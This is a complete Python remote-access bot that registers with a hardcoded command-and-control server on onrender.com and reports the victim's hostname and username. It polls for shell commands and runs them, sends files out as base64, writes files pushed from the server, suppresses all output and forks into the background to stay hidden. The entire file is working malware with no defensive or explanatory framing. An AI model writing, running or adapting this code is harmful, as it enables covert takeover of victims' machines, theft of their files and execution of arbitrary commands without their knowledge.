#!/usr/bin/env python3
import socket,subprocess,time,os,sys,threading,base64,platform
from urllib.request import urlopen,Request
from urllib.error import URLError
import json,uuid,getpass

# ============ CONFIGURATION ============
SERVER = "https://c2-server-io.onrender.com"  # ← CHANGE THIS!
# =======================================

# Silent mode - no output at all
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

class Bot:
    def __init__(self):
        self.id = uuid.uuid4().hex
        self.running = True
        self.process = None
        self.output_buf = []
        
        # Get system info silently
        try:
            self.host = socket.gethostname()
        except:
            self.host = "device"
        
        try:
            self.user = getpass.getuser()
        except:
            self.user = "user"
        
        try:
            self.cwd = os.getcwd()
        except:
            self.cwd = "/"
        
        # Generate stealthy name
        system = platform.system()
        if system == "Windows":
            self.name = f"PC-{self.host[:6]}"
        elif system == "Linux":
            if os.path.exists("/data/data/com.termux"):
                self.name = f"Phone-{self.host[:6]}"
            else:
                self.name = f"Linux-{self.host[:6]}"
        elif system == "Darwin":
            self.name = f"Mac-{self.host[:6]}"
        else:
            self.name = f"Device-{self.host[:6]}"
    
    def req(self, endpoint, data=None):
        """Make HTTP request"""
        try:
            url = SERVER + endpoint
            if data:
                data = json.dumps(data).encode('utf-8')
                req = Request(url, data=data, headers={'Content-Type': 'application/json'})
            else:
                req = Request(url)
            return json.loads(urlopen(req, timeout=5).read())
        except:
            return None
    
    def exe(self, cmd):
        """Execute command silently"""
        try:
            # Handle cd command
            if cmd.strip().startswith('cd '):
                try:
                    path = cmd.strip()[3:].strip()
                    os.chdir(path if path else os.path.expanduser('~'))
                    self.cwd = os.getcwd()
                    return f"Changed to: {self.cwd}"
                except Exception as e:
                    return f"cd error: {str(e)}"
            
            # Execute command
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=self.cwd
            )
            
            self.cwd = os.getcwd()
            output = result.stdout if result.stdout else result.stderr
            return output if output else "Done"
        except subprocess.TimeoutExpired:
            return "Timeout"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def upload(self, filepath):
        """Upload file from bot to server"""
        try:
            if not os.path.exists(filepath):
                return {'status': 'error', 'message': 'File not found'}
            
            with open(filepath, 'rb') as f:
                data = base64.b64encode(f.read()).decode('utf-8')
            
            return {
                'status': 'success',
                'filename': os.path.basename(filepath),
                'data': data,
                'size': os.path.getsize(filepath)
            }
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def download(self, filename, file_data):
        """Download file from server to bot"""
        try:
            data = base64.b64decode(file_data)
            filepath = os.path.join(self.cwd, filename)
            
            with open(filepath, 'wb') as f:
                f.write(data)
            
            return {
                'status': 'success',
                'message': f'Saved to: {filepath}',
                'path': filepath
            }
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def connect(self):
        """Connect to C2"""
        while True:
            try:
                result = self.req('/register', {
                    'client_id': self.id,
                    'name': self.name,
                    'hostname': self.host,
                    'username': self.user,
                    'cwd': self.cwd
                })
                if result:
                    break
            except:
                pass
            time.sleep(5)
    
    def run(self):
        """Main bot loop"""
        # Connect silently
        self.connect()
        
        hb_counter = 0
        
        # Main loop
        while self.running:
            try:
                # Poll for commands
                cmd_data = self.req('/poll', {'client_id': self.id})
                
                if cmd_data and cmd_data.get('command'):
                    cmd_id = cmd_data['id']
                    command = cmd_data['command']
                    cmd_type = cmd_data.get('type', 'execute')
                    
                    # Execute based on type
                    if cmd_type == 'execute':
                        result = self.exe(command)
                        result = {'type': 'normal', 'output': result}
                    elif cmd_type == 'upload':
                        result = self.upload(command)
                    elif cmd_type == 'download':
                        file_data = cmd_data.get('file_data')
                        result = self.download(command, file_data)
                    else:
                        result = {'type': 'normal', 'output': 'Unknown command type'}
                    
                    # Send response
                    self.req('/response', {
                        'id': cmd_id,
                        'result': result,
                        'cwd': self.cwd,
                        'client_id': self.id
                    })
                
                # Heartbeat every 10 seconds
                hb_counter += 1
                if hb_counter >= 10:
                    self.req('/heartbeat', {'client_id': self.id})
                    hb_counter = 0
                
                time.sleep(1)
                
            except KeyboardInterrupt:
                self.running = False
                break
            except:
                time.sleep(5)

def main():
    # Run in background silently
    try:
        # Detach from terminal on Unix
        if os.name != 'nt':
            try:
                if os.fork() > 0:
                    sys.exit(0)
            except:
                pass
        
        # Start bot
        bot = Bot()
        bot.run()
        
    except:
        pass

if __name__ == '__main__':
    main()

